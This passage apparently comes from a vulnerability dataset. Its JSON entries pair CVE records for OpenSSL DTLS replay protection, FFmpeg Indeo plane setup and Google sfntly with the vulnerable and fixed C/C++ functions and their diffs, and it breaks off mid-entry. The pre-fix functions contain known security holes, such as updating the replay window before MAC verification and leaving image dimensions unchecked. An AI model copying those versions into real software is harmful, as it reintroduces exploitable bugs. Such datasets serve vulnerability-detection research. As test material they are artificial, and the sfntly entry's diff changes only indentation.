        "func": "int dtls1_get_record(SSL *s)\n{\n    int ssl_major, ssl_minor;\n    int i, n;\n    SSL3_RECORD *rr;\n    unsigned char *p = NULL;\n    unsigned short version;\n    DTLS1_BITMAP *bitmap;\n    unsigned int is_next_epoch;\n\n    rr = RECORD_LAYER_get_rrec(&s->rlayer);\n\n again:\n    /*\n     * The epoch may have changed.  If so, process all the pending records.\n     * This is a non-blocking operation.\n     */\n    if (!dtls1_process_buffered_records(s))\n        return -1;\n\n    /* if we're renegotiating, then there may be buffered records */\n    if (dtls1_get_processed_record(s))\n        return 1;\n\n    /* get something from the wire */\n\n    /* check if we have the header */\n    if ((RECORD_LAYER_get_rstate(&s->rlayer) != SSL_ST_READ_BODY) ||\n        (RECORD_LAYER_get_packet_length(&s->rlayer) < DTLS1_RT_HEADER_LENGTH)) {\n        n = ssl3_read_n(s, DTLS1_RT_HEADER_LENGTH,\n                        SSL3_BUFFER_get_len(&s->rlayer.rbuf), 0, 1);\n        /* read timeout is handled by dtls1_read_bytes */\n        if (n <= 0)\n            return (n);         /* error or non-blocking */\n\n        /* this packet contained a partial record, dump it */\n        if (RECORD_LAYER_get_packet_length(&s->rlayer) !=\n            DTLS1_RT_HEADER_LENGTH) {\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        RECORD_LAYER_set_rstate(&s->rlayer, SSL_ST_READ_BODY);\n\n        p = RECORD_LAYER_get_packet(&s->rlayer);\n\n        if (s->msg_callback)\n            s->msg_callback(0, 0, SSL3_RT_HEADER, p, DTLS1_RT_HEADER_LENGTH,\n                            s, s->msg_callback_arg);\n\n        /* Pull apart the header into the DTLS1_RECORD */\n        rr->type = *(p++);\n        ssl_major = *(p++);\n        ssl_minor = *(p++);\n        version = (ssl_major << 8) | ssl_minor;\n\n        /* sequence number is 64 bits, with top 2 bytes = epoch */\n        n2s(p, rr->epoch);\n\n        memcpy(&(RECORD_LAYER_get_read_sequence(&s->rlayer)[2]), p, 6);\n        p += 6;\n\n        n2s(p, rr->length);\n\n        /* Lets check version */\n        if (!s->first_packet) {\n            if (version != s->version) {\n                /* unexpected version, silently discard */\n                rr->length = 0;\n                RECORD_LAYER_reset_packet_length(&s->rlayer);\n                goto again;\n            }\n        }\n\n        if ((version & 0xff00) != (s->version & 0xff00)) {\n            /* wrong version, silently discard record */\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        if (rr->length > SSL3_RT_MAX_ENCRYPTED_LENGTH) {\n            /* record too long, silently discard it */\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        /* now s->rlayer.rstate == SSL_ST_READ_BODY */\n    }\n\n    /* s->rlayer.rstate == SSL_ST_READ_BODY, get and decode the data */\n\n    if (rr->length >\n        RECORD_LAYER_get_packet_length(&s->rlayer) - DTLS1_RT_HEADER_LENGTH) {\n        /* now s->packet_length == DTLS1_RT_HEADER_LENGTH */\n        i = rr->length;\n        n = ssl3_read_n(s, i, i, 1, 1);\n        /* this packet contained a partial record, dump it */\n        if (n != i) {\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer);\n            goto again;\n        }\n\n        /*\n         * now n == rr->length, and s->packet_length ==\n         * DTLS1_RT_HEADER_LENGTH + rr->length\n         */\n    }\n    /* set state for later operations */\n    RECORD_LAYER_set_rstate(&s->rlayer, SSL_ST_READ_HEADER);\n\n    /* match epochs.  NULL means the packet is dropped on the floor */\n    bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n    if (bitmap == NULL) {\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n        goto again;             /* get another record */\n    }\n#ifndef OPENSSL_NO_SCTP\n    /* Only do replay check if no SCTP bio */\n    if (!BIO_dgram_is_sctp(SSL_get_rbio(s))) {\n#endif\n        /* Check whether this is a repeat, or aged record. */\n        /*\n         * TODO: Does it make sense to have replay protection in epoch 0 where\n         * we have no integrity negotiated yet?\n         */\n        if (!dtls1_record_replay_check(s, bitmap)) {\n            rr->length = 0;\n            RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n            goto again;         /* get another record */\n        }\n#ifndef OPENSSL_NO_SCTP\n    }\n#endif\n\n    /* just read a 0 length packet */\n    if (rr->length == 0)\n        goto again;\n\n    /*\n     * If this record is from the next epoch (either HM or ALERT), and a\n     * handshake is currently in progress, buffer it since it cannot be\n     * processed at this time.\n     */\n    if (is_next_epoch) {\n        if ((SSL_in_init(s) || ossl_statem_get_in_handshake(s))) {\n            if (dtls1_buffer_record\n                (s, &(DTLS_RECORD_LAYER_get_unprocessed_rcds(&s->rlayer)),\n                 rr->seq_num) < 0)\n                return -1;\n        }\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto again;\n    }\n\n    if (!dtls1_process_record(s, bitmap)) {\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n        goto again;             /* get another record */\n    }\n\n    return (1);\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -15,7 +15,7 @@\n      * The epoch may have changed.  If so, process all the pending records.\n      * This is a non-blocking operation.\n      */\n-    if (dtls1_process_buffered_records(s) < 0)\n+    if (!dtls1_process_buffered_records(s))\n         return -1;\n \n     /* if we're renegotiating, then there may be buffered records */\n@@ -123,6 +123,10 @@\n     if (!BIO_dgram_is_sctp(SSL_get_rbio(s))) {\n #endif\n         /* Check whether this is a repeat, or aged record. */\n+        /*\n+         * TODO: Does it make sense to have replay protection in epoch 0 where\n+         * we have no integrity negotiated yet?\n+         */\n         if (!dtls1_record_replay_check(s, bitmap)) {\n             rr->length = 0;\n             RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n@@ -147,20 +151,17 @@\n                 (s, &(DTLS_RECORD_LAYER_get_unprocessed_rcds(&s->rlayer)),\n                  rr->seq_num) < 0)\n                 return -1;\n-            /* Mark receipt of record. */\n-            dtls1_record_bitmap_update(s, bitmap);\n         }\n         rr->length = 0;\n         RECORD_LAYER_reset_packet_length(&s->rlayer);\n         goto again;\n     }\n \n-    if (!dtls1_process_record(s)) {\n+    if (!dtls1_process_record(s, bitmap)) {\n         rr->length = 0;\n         RECORD_LAYER_reset_packet_length(&s->rlayer); /* dump this record */\n         goto again;             /* get another record */\n     }\n-    dtls1_record_bitmap_update(s, bitmap); /* Mark receipt of record. */\n \n     return (1);\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    if (dtls1_process_buffered_records(s) < 0)",
                "            /* Mark receipt of record. */",
                "            dtls1_record_bitmap_update(s, bitmap);",
                "    if (!dtls1_process_record(s)) {",
                "    dtls1_record_bitmap_update(s, bitmap); /* Mark receipt of record. */"
            ],
            "added_lines": [
                "    if (!dtls1_process_buffered_records(s))",
                "        /*",
                "         * TODO: Does it make sense to have replay protection in epoch 0 where",
                "         * we have no integrity negotiated yet?",
                "         */",
                "    if (!dtls1_process_record(s, bitmap)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2181",
        "func_name": "openssl/dtls1_process_record",
        "description": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.",
        "git_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770",
        "commit_title": "",
        "commit_text": "Fix DTLS replay protection  The DTLS implementation provides some protection against replay attacks in accordance with RFC6347 section 4.1.2.6.  A sliding \"window\" of valid record sequence numbers is maintained with the \"right\" hand edge of the window set to the highest sequence number we have received so far. Records that arrive that are off the \"left\" hand edge of the window are rejected. Records within the window are checked against a list of records received so far. If we already received it then we also reject the new record.  If we have not already received the record, or the sequence number is off the right hand edge of the window then we verify the MAC of the record. If MAC verification fails then we discard the record. Otherwise we mark the record as received. If the sequence number was off the right hand edge of the window, then we slide the window along so that the right hand edge is in line with the newly received sequence number.  Records may arrive for future epochs, i.e. a record from after a CCS being sent, can arrive before the CCS does if the packets get re-ordered. As we have not yet received the CCS we are not yet in a position to decrypt or validate the MAC of those records. OpenSSL places those records on an unprocessed records queue. It additionally updates the window immediately, even though we have not yet verified the MAC. This will only occur if currently in a handshake/renegotiation.  This could be exploited by an attacker by sending a record for the next epoch (which does not have to decrypt or have a valid MAC), with a very large sequence number. This means the right hand edge of the window is moved very far to the right, and all subsequent legitimate packets are dropped causing a denial of service.  A similar effect can be achieved during the initial handshake. In this case there is no MAC key negotiated yet. Therefore an attacker can send a message for the current epoch with a very large sequence number. The code will process the record as normal. If the hanshake message sequence number (as opposed to the record sequence number that we have been talking about so far) is in the future then the injected message is bufferred to be handled later, but the window is still updated. Therefore all subsequent legitimate handshake records are dropped. This aspect is not considered a security issue because there are many ways for an attacker to disrupt the initial handshake and prevent it from completing successfully (e.g. injection of a handshake message will cause the Finished MAC to fail and the handshake to be aborted). This issue comes about as a result of trying to do replay protection, but having no integrity mechanism in place yet. Does it even make sense to have replay protection in epoch 0? That issue isn't addressed here though.  This addressed an OCAP Audit issue.  CVE-2016-2181  ",
        "func_before": "int dtls1_process_record(SSL *s)\n{\n    int i, al;\n    int enc_err;\n    SSL_SESSION *sess;\n    SSL3_RECORD *rr;\n    unsigned int mac_size;\n    unsigned char md[EVP_MAX_MD_SIZE];\n\n    rr = RECORD_LAYER_get_rrec(&s->rlayer);\n    sess = s->session;\n\n    /*\n     * At this point, s->packet_length == SSL3_RT_HEADER_LNGTH + rr->length,\n     * and we have that many bytes in s->packet\n     */\n    rr->input = &(RECORD_LAYER_get_packet(&s->rlayer)[DTLS1_RT_HEADER_LENGTH]);\n\n    /*\n     * ok, we can now read from 's->packet' data into 'rr' rr->input points\n     * at rr->length bytes, which need to be copied into rr->data by either\n     * the decryption or by the decompression When the data is 'copied' into\n     * the rr->data buffer, rr->input will be pointed at the new buffer\n     */\n\n    /*\n     * We now have - encrypted [ MAC [ compressed [ plain ] ] ] rr->length\n     * bytes of encrypted compressed stuff.\n     */\n\n    /* check is not needed I believe */\n    if (rr->length > SSL3_RT_MAX_ENCRYPTED_LENGTH) {\n        al = SSL_AD_RECORD_OVERFLOW;\n        SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_ENCRYPTED_LENGTH_TOO_LONG);\n        goto f_err;\n    }\n\n    /* decrypt in place in 'rr->input' */\n    rr->data = rr->input;\n    rr->orig_len = rr->length;\n\n    enc_err = s->method->ssl3_enc->enc(s, rr, 1, 0);\n    /*-\n     * enc_err is:\n     *    0: (in non-constant time) if the record is publically invalid.\n     *    1: if the padding is valid\n     *   -1: if the padding is invalid\n     */\n    if (enc_err == 0) {\n        /* For DTLS we simply ignore bad packets. */\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto err;\n    }\n#ifdef SSL_DEBUG\n    printf(\"dec %d\\n\", rr->length);\n    {\n        unsigned int z;\n        for (z = 0; z < rr->length; z++)\n            printf(\"%02X%c\", rr->data[z], ((z + 1) % 16) ? ' ' : '\\n');\n    }\n    printf(\"\\n\");\n#endif\n\n    /* r->length is now the compressed data plus mac */\n    if ((sess != NULL) &&\n        (s->enc_read_ctx != NULL) && (EVP_MD_CTX_md(s->read_hash) != NULL)) {\n        /* s->read_hash != NULL => mac_size != -1 */\n        unsigned char *mac = NULL;\n        unsigned char mac_tmp[EVP_MAX_MD_SIZE];\n        mac_size = EVP_MD_CTX_size(s->read_hash);\n        OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);\n\n        /*\n         * orig_len is the length of the record before any padding was\n         * removed. This is public information, as is the MAC in use,\n         * therefore we can safely process the record in a different amount\n         * of time if it's too short to possibly contain a MAC.\n         */\n        if (rr->orig_len < mac_size ||\n            /* CBC records must have a padding length byte too. */\n            (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&\n             rr->orig_len < mac_size + 1)) {\n            al = SSL_AD_DECODE_ERROR;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n\n        if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE) {\n            /*\n             * We update the length so that the TLS header bytes can be\n             * constructed correctly but we need to extract the MAC in\n             * constant time from within the record, without leaking the\n             * contents of the padding bytes.\n             */\n            mac = mac_tmp;\n            ssl3_cbc_copy_mac(mac_tmp, rr, mac_size);\n            rr->length -= mac_size;\n        } else {\n            /*\n             * In this case there's no padding, so |rec->orig_len| equals\n             * |rec->length| and we checked that there's enough bytes for\n             * |mac_size| above.\n             */\n            rr->length -= mac_size;\n            mac = &rr->data[rr->length];\n        }\n\n        i = s->method->ssl3_enc->mac(s, rr, md, 0 /* not send */ );\n        if (i < 0 || mac == NULL\n            || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)\n            enc_err = -1;\n        if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH + mac_size)\n            enc_err = -1;\n    }\n\n    if (enc_err < 0) {\n        /* decryption failed, silently discard message */\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto err;\n    }\n\n    /* r->length is now just compressed */\n    if (s->expand != NULL) {\n        if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH) {\n            al = SSL_AD_RECORD_OVERFLOW;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD,\n                   SSL_R_COMPRESSED_LENGTH_TOO_LONG);\n            goto f_err;\n        }\n        if (!ssl3_do_uncompress(s, rr)) {\n            al = SSL_AD_DECOMPRESSION_FAILURE;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_BAD_DECOMPRESSION);\n            goto f_err;\n        }\n    }\n\n    if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH) {\n        al = SSL_AD_RECORD_OVERFLOW;\n        SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_DATA_LENGTH_TOO_LONG);\n        goto f_err;\n    }\n\n    rr->off = 0;\n    /*-\n     * So at this point the following is true\n     * ssl->s3->rrec.type   is the type of record\n     * ssl->s3->rrec.length == number of bytes in record\n     * ssl->s3->rrec.off    == offset to first valid byte\n     * ssl->s3->rrec.data   == where to take bytes from, increment\n     *                         after use :-).\n     */\n\n    /* we have pulled in a full packet so zero things */\n    RECORD_LAYER_reset_packet_length(&s->rlayer);\n    return (1);\n\n f_err:\n    ssl3_send_alert(s, SSL3_AL_FATAL, al);\n err:\n    return (0);\n}",
        "func": "int dtls1_process_record(SSL *s, DTLS1_BITMAP *bitmap)\n{\n    int i, al;\n    int enc_err;\n    SSL_SESSION *sess;\n    SSL3_RECORD *rr;\n    unsigned int mac_size;\n    unsigned char md[EVP_MAX_MD_SIZE];\n\n    rr = RECORD_LAYER_get_rrec(&s->rlayer);\n    sess = s->session;\n\n    /*\n     * At this point, s->packet_length == SSL3_RT_HEADER_LNGTH + rr->length,\n     * and we have that many bytes in s->packet\n     */\n    rr->input = &(RECORD_LAYER_get_packet(&s->rlayer)[DTLS1_RT_HEADER_LENGTH]);\n\n    /*\n     * ok, we can now read from 's->packet' data into 'rr' rr->input points\n     * at rr->length bytes, which need to be copied into rr->data by either\n     * the decryption or by the decompression When the data is 'copied' into\n     * the rr->data buffer, rr->input will be pointed at the new buffer\n     */\n\n    /*\n     * We now have - encrypted [ MAC [ compressed [ plain ] ] ] rr->length\n     * bytes of encrypted compressed stuff.\n     */\n\n    /* check is not needed I believe */\n    if (rr->length > SSL3_RT_MAX_ENCRYPTED_LENGTH) {\n        al = SSL_AD_RECORD_OVERFLOW;\n        SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_ENCRYPTED_LENGTH_TOO_LONG);\n        goto f_err;\n    }\n\n    /* decrypt in place in 'rr->input' */\n    rr->data = rr->input;\n    rr->orig_len = rr->length;\n\n    enc_err = s->method->ssl3_enc->enc(s, rr, 1, 0);\n    /*-\n     * enc_err is:\n     *    0: (in non-constant time) if the record is publically invalid.\n     *    1: if the padding is valid\n     *   -1: if the padding is invalid\n     */\n    if (enc_err == 0) {\n        /* For DTLS we simply ignore bad packets. */\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto err;\n    }\n#ifdef SSL_DEBUG\n    printf(\"dec %d\\n\", rr->length);\n    {\n        unsigned int z;\n        for (z = 0; z < rr->length; z++)\n            printf(\"%02X%c\", rr->data[z], ((z + 1) % 16) ? ' ' : '\\n');\n    }\n    printf(\"\\n\");\n#endif\n\n    /* r->length is now the compressed data plus mac */\n    if ((sess != NULL) &&\n        (s->enc_read_ctx != NULL) && (EVP_MD_CTX_md(s->read_hash) != NULL)) {\n        /* s->read_hash != NULL => mac_size != -1 */\n        unsigned char *mac = NULL;\n        unsigned char mac_tmp[EVP_MAX_MD_SIZE];\n        mac_size = EVP_MD_CTX_size(s->read_hash);\n        OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);\n\n        /*\n         * orig_len is the length of the record before any padding was\n         * removed. This is public information, as is the MAC in use,\n         * therefore we can safely process the record in a different amount\n         * of time if it's too short to possibly contain a MAC.\n         */\n        if (rr->orig_len < mac_size ||\n            /* CBC records must have a padding length byte too. */\n            (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&\n             rr->orig_len < mac_size + 1)) {\n            al = SSL_AD_DECODE_ERROR;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n\n        if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE) {\n            /*\n             * We update the length so that the TLS header bytes can be\n             * constructed correctly but we need to extract the MAC in\n             * constant time from within the record, without leaking the\n             * contents of the padding bytes.\n             */\n            mac = mac_tmp;\n            ssl3_cbc_copy_mac(mac_tmp, rr, mac_size);\n            rr->length -= mac_size;\n        } else {\n            /*\n             * In this case there's no padding, so |rec->orig_len| equals\n             * |rec->length| and we checked that there's enough bytes for\n             * |mac_size| above.\n             */\n            rr->length -= mac_size;\n            mac = &rr->data[rr->length];\n        }\n\n        i = s->method->ssl3_enc->mac(s, rr, md, 0 /* not send */ );\n        if (i < 0 || mac == NULL\n            || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)\n            enc_err = -1;\n        if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH + mac_size)\n            enc_err = -1;\n    }\n\n    if (enc_err < 0) {\n        /* decryption failed, silently discard message */\n        rr->length = 0;\n        RECORD_LAYER_reset_packet_length(&s->rlayer);\n        goto err;\n    }\n\n    /* r->length is now just compressed */\n    if (s->expand != NULL) {\n        if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH) {\n            al = SSL_AD_RECORD_OVERFLOW;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD,\n                   SSL_R_COMPRESSED_LENGTH_TOO_LONG);\n            goto f_err;\n        }\n        if (!ssl3_do_uncompress(s, rr)) {\n            al = SSL_AD_DECOMPRESSION_FAILURE;\n            SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_BAD_DECOMPRESSION);\n            goto f_err;\n        }\n    }\n\n    if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH) {\n        al = SSL_AD_RECORD_OVERFLOW;\n        SSLerr(SSL_F_DTLS1_PROCESS_RECORD, SSL_R_DATA_LENGTH_TOO_LONG);\n        goto f_err;\n    }\n\n    rr->off = 0;\n    /*-\n     * So at this point the following is true\n     * ssl->s3->rrec.type   is the type of record\n     * ssl->s3->rrec.length == number of bytes in record\n     * ssl->s3->rrec.off    == offset to first valid byte\n     * ssl->s3->rrec.data   == where to take bytes from, increment\n     *                         after use :-).\n     */\n\n    /* we have pulled in a full packet so zero things */\n    RECORD_LAYER_reset_packet_length(&s->rlayer);\n\n    /* Mark receipt of record. */\n    dtls1_record_bitmap_update(s, bitmap);\n\n    return (1);\n\n f_err:\n    ssl3_send_alert(s, SSL3_AL_FATAL, al);\n err:\n    return (0);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,4 @@\n-int dtls1_process_record(SSL *s)\n+int dtls1_process_record(SSL *s, DTLS1_BITMAP *bitmap)\n {\n     int i, al;\n     int enc_err;\n@@ -154,6 +154,10 @@\n \n     /* we have pulled in a full packet so zero things */\n     RECORD_LAYER_reset_packet_length(&s->rlayer);\n+\n+    /* Mark receipt of record. */\n+    dtls1_record_bitmap_update(s, bitmap);\n+\n     return (1);\n \n  f_err:",
        "diff_line_info": {
            "deleted_lines": [
                "int dtls1_process_record(SSL *s)"
            ],
            "added_lines": [
                "int dtls1_process_record(SSL *s, DTLS1_BITMAP *bitmap)",
                "",
                "    /* Mark receipt of record. */",
                "    dtls1_record_bitmap_update(s, bitmap);",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8364",
        "func_name": "ffmpeg/ff_ivi_init_planes",
        "description": "Integer overflow in the ff_ivi_init_planes function in libavcodec/ivi.c in FFmpeg before 2.6.5, 2.7.x before 2.7.3, and 2.8.x through 2.8.2 allows remote attackers to cause a denial of service (out-of-bounds heap-memory access) or possibly have unspecified other impact via crafted image dimensions in Indeo Video Interactive data.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=df91aa034b82b77a3c4e01791f4a2b2ff6c82066",
        "commit_title": "",
        "commit_text": "avcodec/ivi: Check image dimensions  Fixes integer overflow  ",
        "func_before": "av_cold int ff_ivi_init_planes(IVIPlaneDesc *planes, const IVIPicConfig *cfg,\n                               int is_indeo4)\n{\n    int p, b;\n    uint32_t b_width, b_height, align_fac, width_aligned,\n             height_aligned, buf_size;\n    IVIBandDesc *band;\n\n    ivi_free_buffers(planes);\n\n    if (cfg->pic_width < 1 || cfg->pic_height < 1 ||\n        cfg->luma_bands < 1 || cfg->chroma_bands < 1)\n        return AVERROR_INVALIDDATA;\n\n    /* fill in the descriptor of the luminance plane */\n    planes[0].width     = cfg->pic_width;\n    planes[0].height    = cfg->pic_height;\n    planes[0].num_bands = cfg->luma_bands;\n\n    /* fill in the descriptors of the chrominance planes */\n    planes[1].width     = planes[2].width     = (cfg->pic_width  + 3) >> 2;\n    planes[1].height    = planes[2].height    = (cfg->pic_height + 3) >> 2;\n    planes[1].num_bands = planes[2].num_bands = cfg->chroma_bands;\n\n    for (p = 0; p < 3; p++) {\n        planes[p].bands = av_mallocz_array(planes[p].num_bands, sizeof(IVIBandDesc));\n        if (!planes[p].bands)\n            return AVERROR(ENOMEM);\n\n        /* select band dimensions: if there is only one band then it\n         *  has the full size, if there are several bands each of them\n         *  has only half size */\n        b_width  = planes[p].num_bands == 1 ? planes[p].width\n                                            : (planes[p].width  + 1) >> 1;\n        b_height = planes[p].num_bands == 1 ? planes[p].height\n                                            : (planes[p].height + 1) >> 1;\n\n        /* luma   band buffers will be aligned on 16x16 (max macroblock size) */\n        /* chroma band buffers will be aligned on   8x8 (max macroblock size) */\n        align_fac       = p ? 8 : 16;\n        width_aligned   = FFALIGN(b_width , align_fac);\n        height_aligned  = FFALIGN(b_height, align_fac);\n        buf_size        = width_aligned * height_aligned * sizeof(int16_t);\n\n        for (b = 0; b < planes[p].num_bands; b++) {\n            band = &planes[p].bands[b]; /* select appropriate plane/band */\n            band->plane    = p;\n            band->band_num = b;\n            band->width    = b_width;\n            band->height   = b_height;\n            band->pitch    = width_aligned;\n            band->aheight  = height_aligned;\n            band->bufs[0]  = av_mallocz(buf_size);\n            band->bufs[1]  = av_mallocz(buf_size);\n            band->bufsize  = buf_size/2;\n            if (!band->bufs[0] || !band->bufs[1])\n                return AVERROR(ENOMEM);\n\n            /* allocate the 3rd band buffer for scalability mode */\n            if (cfg->luma_bands > 1) {\n                band->bufs[2] = av_mallocz(buf_size);\n                if (!band->bufs[2])\n                    return AVERROR(ENOMEM);\n            }\n            if (is_indeo4) {\n                band->bufs[3]  = av_mallocz(buf_size);\n                if (!band->bufs[3])\n                    return AVERROR(ENOMEM);\n            }\n            /* reset custom vlc */\n            planes[p].bands[0].blk_vlc.cust_desc.num_rows = 0;\n        }\n    }\n\n    return 0;\n}",
        "func": "av_cold int ff_ivi_init_planes(IVIPlaneDesc *planes, const IVIPicConfig *cfg,\n                               int is_indeo4)\n{\n    int p, b;\n    uint32_t b_width, b_height, align_fac, width_aligned,\n             height_aligned, buf_size;\n    IVIBandDesc *band;\n\n    ivi_free_buffers(planes);\n\n    if (av_image_check_size(cfg->pic_width, cfg->pic_height, 0, NULL) < 0 ||\n        cfg->luma_bands < 1 || cfg->chroma_bands < 1)\n        return AVERROR_INVALIDDATA;\n\n    /* fill in the descriptor of the luminance plane */\n    planes[0].width     = cfg->pic_width;\n    planes[0].height    = cfg->pic_height;\n    planes[0].num_bands = cfg->luma_bands;\n\n    /* fill in the descriptors of the chrominance planes */\n    planes[1].width     = planes[2].width     = (cfg->pic_width  + 3) >> 2;\n    planes[1].height    = planes[2].height    = (cfg->pic_height + 3) >> 2;\n    planes[1].num_bands = planes[2].num_bands = cfg->chroma_bands;\n\n    for (p = 0; p < 3; p++) {\n        planes[p].bands = av_mallocz_array(planes[p].num_bands, sizeof(IVIBandDesc));\n        if (!planes[p].bands)\n            return AVERROR(ENOMEM);\n\n        /* select band dimensions: if there is only one band then it\n         *  has the full size, if there are several bands each of them\n         *  has only half size */\n        b_width  = planes[p].num_bands == 1 ? planes[p].width\n                                            : (planes[p].width  + 1) >> 1;\n        b_height = planes[p].num_bands == 1 ? planes[p].height\n                                            : (planes[p].height + 1) >> 1;\n\n        /* luma   band buffers will be aligned on 16x16 (max macroblock size) */\n        /* chroma band buffers will be aligned on   8x8 (max macroblock size) */\n        align_fac       = p ? 8 : 16;\n        width_aligned   = FFALIGN(b_width , align_fac);\n        height_aligned  = FFALIGN(b_height, align_fac);\n        buf_size        = width_aligned * height_aligned * sizeof(int16_t);\n\n        for (b = 0; b < planes[p].num_bands; b++) {\n            band = &planes[p].bands[b]; /* select appropriate plane/band */\n            band->plane    = p;\n            band->band_num = b;\n            band->width    = b_width;\n            band->height   = b_height;\n            band->pitch    = width_aligned;\n            band->aheight  = height_aligned;\n            band->bufs[0]  = av_mallocz(buf_size);\n            band->bufs[1]  = av_mallocz(buf_size);\n            band->bufsize  = buf_size/2;\n            if (!band->bufs[0] || !band->bufs[1])\n                return AVERROR(ENOMEM);\n\n            /* allocate the 3rd band buffer for scalability mode */\n            if (cfg->luma_bands > 1) {\n                band->bufs[2] = av_mallocz(buf_size);\n                if (!band->bufs[2])\n                    return AVERROR(ENOMEM);\n            }\n            if (is_indeo4) {\n                band->bufs[3]  = av_mallocz(buf_size);\n                if (!band->bufs[3])\n                    return AVERROR(ENOMEM);\n            }\n            /* reset custom vlc */\n            planes[p].bands[0].blk_vlc.cust_desc.num_rows = 0;\n        }\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n \n     ivi_free_buffers(planes);\n \n-    if (cfg->pic_width < 1 || cfg->pic_height < 1 ||\n+    if (av_image_check_size(cfg->pic_width, cfg->pic_height, 0, NULL) < 0 ||\n         cfg->luma_bands < 1 || cfg->chroma_bands < 1)\n         return AVERROR_INVALIDDATA;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    if (cfg->pic_width < 1 || cfg->pic_height < 1 ||"
            ],
            "added_lines": [
                "    if (av_image_check_size(cfg->pic_width, cfg->pic_height, 0, NULL) < 0 ||"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-6781",
        "func_name": "googlefonts/sfntly/FontData::FontData",
        "description": "Integer overflow in the FontData::Bound function in data/font_data.cc in Google sfntly, as used in Google Chrome before 47.0.2526.73, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted offset or length value within font data in an SFNT container.",
        "git_url": "https://github.com/googlefonts/sfntly/commit/de776d4ef06ca29c240de3444348894f032b03ff",
        "commit_title": "Check for integer overflow in sfntly::FontData::Bound().",
        "commit_text": " Also delete dead code and cleanup some nits.  This is cl/96914065.",
        "func_before": "FontData::FontData(FontData* data, int32_t offset) {\n  Init(data->array_);\n  Bound(data->bound_offset_ + offset,\n        (data->bound_length_ == GROWABLE_SIZE)\n            ? GROWABLE_SIZE : data->bound_length_ - offset);\n}",
        "func": "FontData::FontData(FontData* data, int32_t offset) {\n  Init(data->array_);\n  Bound(data->bound_offset_ + offset,\n        (data->bound_length_ == GROWABLE_SIZE)\n        ? GROWABLE_SIZE : data->bound_length_ - offset);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,5 +2,5 @@\n   Init(data->array_);\n   Bound(data->bound_offset_ + offset,\n         (data->bound_length_ == GROWABLE_SIZE)\n-            ? GROWABLE_SIZE : data->bound_length_ - offset);\n+        ? GROWABLE_SIZE : data->bound_length_ - offset);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "            ? GROWABLE_SIZE : data->bound_length_ - offset);"
            ],
            "added_lines": [
                "        ? GROWABLE_SIZE : data->bound_length_ - offset);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1794",
        "func_name": "openssl/ssl3_get_key_exchange",
        "description": "The ssl3_get_key_exchange function in ssl/s3_clnt.c in OpenSSL 1.0.2 before 1.0.2e allows remote servers to cause a denial of service (segmentation fault) via a zero p value in an anonymous Diffie-Hellman (DH) ServerKeyExchange message.",
        "git_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=ada57746b6b80beae73111fe1291bf8dd89af91c",
        "commit_title": "",
